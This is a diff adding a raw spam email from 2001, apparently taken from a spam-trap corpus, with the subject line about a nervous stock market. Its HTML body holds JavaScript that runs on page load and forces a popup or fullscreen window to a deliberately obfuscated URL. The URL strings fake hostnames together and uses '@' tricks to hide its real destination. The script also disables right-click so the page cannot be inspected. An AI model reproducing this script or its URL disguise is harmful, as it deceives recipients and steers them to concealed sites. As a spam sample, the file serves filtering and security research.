@@ -1,0 +1,158 @@
+Return-Path: <joneme@ozemail.com.au>
+Delivered-To: em-ca-bait@em.ca
+Received: (qmail 1726 invoked from network); 29 Mar 2001 01:49:02 -0000
+Received: from unknown (HELO mail.bigsale.com) (203.248.138.4)
+  by em.ca with SMTP; 29 Mar 2001 01:49:02 -0000
+Received: from rsvp-207-173-147-140.ac05.rcrd.eli.net_[207.173.147.140] (rsvp-207-173-147-140.ac05.rcrd.eli.net [207.173.147.140])
+	by mail.bigsale.com (8.9.3/8.9.3) with SMTP id SAA12644;
+	Thu, 29 Mar 2001 18:40:34 +0900
+From: joneme@ozemail.com.au
+Received: from mail.01p.gr by rsvp-207-173-147-140.ac05.rcrd.eli.net with ESMTP; Wed, 28 Mar 2001 20:01:22 -0600
+Message-ID: <00001b265a24$000015ad$00004594@mail.01p.gr>
+To: <howard@5Business.cc>
+Subject: Stock market making you nervous?                         17812
+Date: Wed, 28 Mar 2001 20:01:08 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3
+X-MSMail-Priority: Normal
+Reply-To: johnboy@5Business.cc
+X-Mailer: QUALCOMM Windows Eudora Version 4.3.2
+Content-Length: 3990
+Lines: 133
+
+<HTML>
+<BODY>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+
+<HEAD>
+<meta http-equiv=3D"Page-Enter" CONTENT=3D"RevealTrans(Duration=3D4,Transi=
+tion=3D10)">
+<script language=3D"JavaScript"> <!--
+
+var message=3D"Sorry, that function is disabled."; // Message for the aler=
+t box
+
+// Don't edit below!
+function closeit() {
+
+     window.close()
+
+}
+function intro()
+{
+	if ((navigator.appVersion.indexOf("Mac")!=3D-1) &&
+(navigator.userAgent.indexOf("MSIE")!=3D-1) &&
+(parseInt(navigator.appVersion)=3D=3D4))
+	{
+	skip()
+	}
+	else 
+	{ 
+	popup()
+	}
+
+}
+function skip()
+{
+	location.href=3D"http://www.hongkong.com";
+}
+function popup()
+{
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	
+	{
+	if (navigator.appName=3D=3D"Netscape")
+ {
+    Hello =3D window.open("http://www.members.geocities.com%40www.foreigne=
+xchange.i85.net%40www.cybercafe.envy.nu:209.247.194.44=3Dredirect=3D%40www=
+.myplaceonthenet.hypermart.net+cgi=3DSource&Location_override=3Dwww.curren=
+cyexchange.com@wvvvv.bizland.com/=3D?redirect=3D209.185.151.131@www.curdig=
+italdatastreamcomputernetworking.com/redirect.cgi?-refer#4908732?http://ge=
+ocities.net/majorcomputernetworking:endofline.com?needanumeralhexadec.com:=
+1.5.4://redirect?ebay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?di=
+gitaldatastreamcomputernetworking.com/main.html?http://geocities.net/major=
+computernetworking:endofline.com?http://www.delhadata.com:1.5.4://redirect=
+:ebay.com/hobbies/http://mnumeralhexadecimal.com?12.5.102.4/","Hello","scr=
+ollbars");
+    Hello.focus();
+                
+}
+
+		
+if (navigator.appName=3D=3D"Microsoft Internet Explorer")
+		{
+			window.open("http://www.members.geocities.com%40www.foreignexchange.i85=
+.net%40www.cybercafe.envy.nu:209.247.194.44=3Dredirect=3D%40www.myplaceont=
+henet.hypermart.net+cgi=3DSource&Location_override=3Dwww.currencyexchange.=
+com@wvvvv.bizland.com/=3D?redirect=3D209.185.151.131@www.curdigitaldatastr=
+eamcomputernetworking.com/redirect.cgi?-refer#4908732?http://geocities.net=
+/majorcomputernetworking:endofline.com?needanumeralhexadec.com:1.5.4://red=
+irect?ebay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?digitaldatast=
+reamcomputernetworking.com/main.html?http://geocities.net/majorcomputernet=
+working:endofline.com?http://www.delhadata.com:1.5.4://redirect:ebay.com/h=
+obbies/http://mnumeralhexadecimal.com?12.5.102.4/","screen","fullscreen=3D=
+yes");
+		}
+	}
+	else
+	{
+		location.href=3D"http://www.members.geocities.com%40www.foreignexchange.=
+i85.net%40www.cybercafe.envy.nu:209.247.194.44=3Dredirect=3D%40www.myplace=
+onthenet.hypermart.net+cgi=3DSource&Location_override=3Dwww.currencyexchan=
+ge.com@wvvvv.bizland.com/=3D?redirect=3D209.185.151.131@www.curdigitaldata=
+streamcomputernetworking.com/redirect.cgi?-refer#4908732?http://geocities.=
+net/majorcomputernetworking:endofline.com?needanumeralhexadec.com:1.5.4://=
+redirect?ebay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?digitaldat=
+astreamcomputernetworking.com/main.html?http://geocities.net/majorcomputer=
+networking:endofline.com?http://www.delhadata.com:1.5.4://redirect:ebay.co=
+m/hobbies/http://mnumeralhexadecimal.com?12.5.102.4/";
+	}
+
+}
+function click(e) {
+if (document.all) {
+if (event.button =3D=3D 2) {
+alert(message);
+return false;
+}
+}
+if (document.layers) {
+if (e.which =3D=3D 3) {
+alert(message);
+return false;
+}
+}
+}
+if (document.layers) {
+document.captureEvents(Event.MOUSEDOWN);
+}
+document.onmousedown=3Dclick;
+// --> </script>
+
+	<META NAME=3D"GENERATOR" Content=3D"Visual Page 1.0 for Windows">
+	<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;CHARSET=3Diso-8859=
+-1">
+	<TITLE>Hello</TITLE>
+</HEAD>
+
+<BODY BGCOLOR=3D"#0000AA" LINK=3D"#000000" onLoad=3D"intro()">
+
+<P><SCRIPT LANGUAGE=3D"Javascript">
+</SCRIPT>
+
+
+</BODY>
+
+</HTML>
+
+
+
